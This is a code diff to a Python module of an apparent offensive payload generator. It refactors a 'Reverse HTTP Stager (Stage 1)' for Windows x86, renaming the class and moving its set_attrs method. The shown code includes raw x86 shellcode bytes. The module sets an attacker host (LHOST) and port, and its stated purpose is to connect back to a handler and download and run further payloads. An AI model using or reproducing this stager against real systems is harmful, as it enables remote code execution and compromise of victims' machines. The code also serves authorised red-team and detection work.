@@ -11,12 +11,13 @@ import struct
 import sys
 
 
-class RevHTTP:
+class PayloadModule:
 
-    def __init__(self):
+    def __init__(self, cli_arguments):
         self.name = "Reverse HTTP Stager (Stage 1)"
         self.description = "Connects back to a handler to download and run\
             fun files over HTTP :)"
+        self.cli_name = "rev_http"
         self.platform = "Windows"
         self.arch = "x86"
         self.lport = 4444
@@ -47,22 +48,6 @@ class RevHTTP:
             "\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x53\x89\xE7\x57\x68\x00\x20\x00" +
             "\x00\x53\x56\x68\x12\x96\x89\xE2\xFF\xD5\x85\xC0\x74\xBF\x8B\x07" +
             "\x01\xC3\x85\xC0\x75\xE5\x58\xC3\xE8\x7D\xFF\xFF\xFF")
-
-    def set_attrs(self, lport_value, lhost_value):
-        self.lport = lport_value
-
-        # Check if given a domain or IP address:
-        if self.validate_ip(lhost_value):
-            self.lhost = lhost_value
-        else:
-            try:
-                self.lhost = socket.gethostbyname(lhost_value)
-            except socket.gaierror:
-                print "[*] Error: Invalid domain or IP provided for LHOST value!"
-                print "[*] Error: Please re-run with the correct value."
-                sys.exit()
-
-        return
 
     def gen_shellcode(self):
         # Take the passed in attributes and gen shellcode
@@ -165,3 +150,19 @@ class RevHTTP:
                     return False
             return True
         return False
+
+    def set_attrs(self, lport_value, lhost_value):
+        self.lport = lport_value
+
+        # Check if given a domain or IP address:
+        if self.validate_ip(lhost_value):
+            self.lhost = lhost_value
+        else:
+            try:
+                self.lhost = socket.gethostbyname(lhost_value)
+            except socket.gaierror:
+                print "[*] Error: Invalid domain or IP provided for LHOST value!"
+                print "[*] Error: Please re-run with the correct value."
+                sys.exit()
+
+        return
